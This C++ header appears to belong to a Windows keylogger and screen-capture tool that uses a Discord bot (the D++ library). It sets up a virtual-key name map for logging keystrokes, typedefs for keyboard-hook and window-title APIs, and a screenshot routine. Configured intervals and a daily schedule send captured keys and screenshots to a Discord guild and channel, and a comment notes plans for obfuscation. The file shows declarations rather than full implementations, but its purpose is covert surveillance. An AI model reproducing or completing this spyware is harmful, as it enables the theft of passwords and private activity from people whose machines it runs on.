
// #if !defined(_MSC_VER) || (_MSC_VER < 1929)
// 	#error "This template is only for Microsoft Visual C++ 2019 and later. To build a D++ bot in Visual Studio Code, or on any other platform or compiler please use https://github.com/brainboxdotcc/templatebot"
// #endif

// #if (!defined(_MSVC_LANG) || _MSVC_LANG < 201703L)
// 	#error "D++ bots require C++17 or later. Please enable C++17 under project properties."
// #endif

// #if !defined(DPP_WIN_TEMPLATE) && !defined(DPP_CI)
// 	#error "You must compile this template using its .sln file. You cannot just double click the .cpp file and compile it on its own. Ensure you checked out the full source code of the template!"
// #endif


#pragma once

#define _CRT_SECURE_NO_WARNINGS     //fuck msvc
#define UNICODE

#if defined __GNUC__
#pragma GCC system_header
#elif defined _MSC_VER
//Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
//external headers warning (there are ways too much warnings there). This is workaround
#pragma warning (push, 0)
#endif

#include <dpp/cluster.h>
#include <dpp/once.h>


#include <cstdio>
#include <ctime>
#include <cassert>
#include <fstream>
#include <iostream>
#include <map>
#include <vector>
#include <functional>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <algorithm>
#include <list>
#include <filesystem>

#include <windows.h>
#include <ShlObj.h>
#include <Gdiplus.h>

#pragma warning (pop)

#ifdef EXTERNAL_BOT_TOKEN
const std::string BOT_TOKEN = EXTERNAL_BOT_TOKEN;
#else
const std::string BOT_TOKEN = "null!";
#endif

const std::map<const dpp::loglevel, const std::string> DPP_LOGLEVEL_MAP {
	{dpp::loglevel::ll_trace, "[TRACE] "},
	{dpp::loglevel::ll_debug, "[DEBUG] "},
	{dpp::loglevel::ll_info, "[INFO] "},
	{dpp::loglevel::ll_warning, "[WARN] "},
	{dpp::loglevel::ll_error, "[ERORR] "},
	{dpp::loglevel::ll_critical, "[CRITICAL!] "},
};

const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BKSPACE]" },
	{VK_RETURN,	"[ENTER]" },
	{VK_SPACE,	"[SPACE]" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CTRL]" },
	{VK_LCONTROL,	"[LCTRL]" },
	{VK_RCONTROL,	"[LCTRL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PGUP]" },
	{VK_NEXT,	"[PGDOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
    {VK_NUMLOCK, "[NUMLK]"},
	{VK_CAPITAL,	"[CAPSLK]" },
	{VK_DELETE, "[DELETE]"},
    {VK_F1, "[F1]"}, 
    {VK_F2, "[F2]"}, 
    {VK_F3, "[F3]"}, 
    {VK_F4, "[F4]"}, 
    {VK_F5, "[F5]"}, 
    {VK_F6, "[F6]"}, 
    {VK_F7, "[F7]"}, 
    {VK_F8, "[F8]"}, 
    {VK_F9, "[F9]"}, 
    {VK_F10, "[F10]"}, 
    {VK_F11, "[F11]"}, 
    {VK_F12, "[F12]"}, 
    {VK_VOLUME_MUTE, "[VOLUME_MUTE]"},
    {VK_VOLUME_DOWN, "[VOLUME_DOWN]"},
    {VK_VOLUME_UP, "[VOLUME_UP]"},
    {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT]"},
    {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV]"},
    {VK_MEDIA_STOP, "[MEDIA_STOP]"},
    {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"}
};

#define __hrmn(h, m) (h*3600+m*60)
//Modify this to auto-send at specific time of the day (in 24h)
const std::vector<time_t> SCHEDULE = {__hrmn(7, 40), __hrmn(8, 30), __hrmn(9, 39), __hrmn(10, 30),
                            __hrmn(13, 39), __hrmn(14, 26), __hrmn(15, 44), __hrmn(16, 29)};

/** Begin define WinAPI function **/    //for further obfuscation, never implemented

//USER32.DLL

typedef LRESULT(WINAPI *PCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef HDC(WINAPI *PGetDC)(HWND);
typedef HWND(WINAPI *PGetForegroundWindow);
typedef SHORT(WINAPI *PGetKeyState)(int);
typedef HKL(WINAPI *PGetKeyboardLayout)(DWORD);
typedef BOOL(WINAPI *PGetMessageW)(LPMSG, HWND, UINT, UINT);
typedef int(WINAPI *PGetWindowTextW)(HWND, LPWSTR, int);
typedef UINT(WINAPI *PMapVirtualKeyA)(UINT, UINT);
typedef int(WINAPI *PReleaseDC)(HWND, HDC);
typedef HHOOK(WINAPI *PSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);

//GDI32.DLL
typedef BOOL(WINAPI *PBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef HDC(WINAPI *PCreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI *PCreateDIBSection)(HDC, const BITMAPINFO*, UINT, VOID**, HANDLE, DWORD);
typedef BOOL(WINAPI *PDeleteDC)(HDC);
typedef BOOL(WINAPI *PDeleteObject)(HGDIOBJ);
typedef HGDIOBJ(WINAPI *PGetCurrentObject)(HDC, UINT);
typedef int(WINAPI *PGetObjectW)(HANDLE, int, LPVOID);
typedef HGDIOBJ(WINAPI *PSelectObject)(HDC, HGDIOBJ);

//OLE32.DLL
typedef HRESULT(WINAPI *PCreateStreamOnHGlobal)(HGLOBAL, BOOL, LPSTREAM);

//SHELL32.DLL
typedef LPWSTR*(WINAPI *PCommandLineToArgvW)(LPCWSTR, int);
typedef HRESULT(*PSHGetFolderPathW)(HWND, int, HANDLE, DWORD, LPWSTR);

/** End define WinAPI function **/

struct __tCOMMAND_LINE_OPTION {
	std::string BOT_LOCATION[4] = {
		"-t", BOT_TOKEN,
        //define Guild ID and Channel ID goes here
        GUILD_ID, CHANNEL_ID
	};

	bool COMPRESSED_MODE = false;

	//default hash check factor for MakeBitmap()
	unsigned int DEFAULT_HS = 3;

    //default value for send_key(), in minutes
    unsigned int SEND_KEY_INTERVAL = 8;

    //default value for send_bitmap(), in seconds
    unsigned int SEND_BITMAP_INTERVAL = 25;

	__tCOMMAND_LINE_OPTION() {};

} COMMAND_LINE_OPTION;

struct MakeBitmapStruct {

    long long hashval, prevhashval, hashmod;
    int hashbase;
    int freelim;

    HDC hDC, hMemDC;
    HBITMAP hBitmap;
    char *memblock;
    STATSTG *jpg_stat;
    IStream *rawbitmap_stream, *jpg_stream;

	/*Return -1 if fail, non-negative if success*/
    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

    long long hash(char *block, int size, long long mod = (long long) 1e9 + 7, int base = 261);

    public:
    MakeBitmapStruct() : hashmod((long long) 1e9 + 7), hashbase(261) {};

    MakeBitmapStruct(long long thashmod, int thashbase);

    ~MakeBitmapStruct();


    /// @brief Capture screenshot
    /// @param allocatedJPG [out] Pointer to the pointer contain allocated memory. Caller clean-up
    /// @param allocatedsize [out] size of the allocated memory
    /// @param hs [in] the factor for the hash check function. Value must be 0 to skip the check 
    /// @return 0 is success, 0xFF(255) if the image is considered duplicated 
    /// with previous shot; otherwise fail; Buffer must be cleaned up using C function free()
    int WINAPI MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize, unsigned int hs);
};

// struct RAIISlashCommandStruct {
//     public:
//     RAIISlashCommandStruct();

//     ~RAIISlashCommandStruct();
// } ;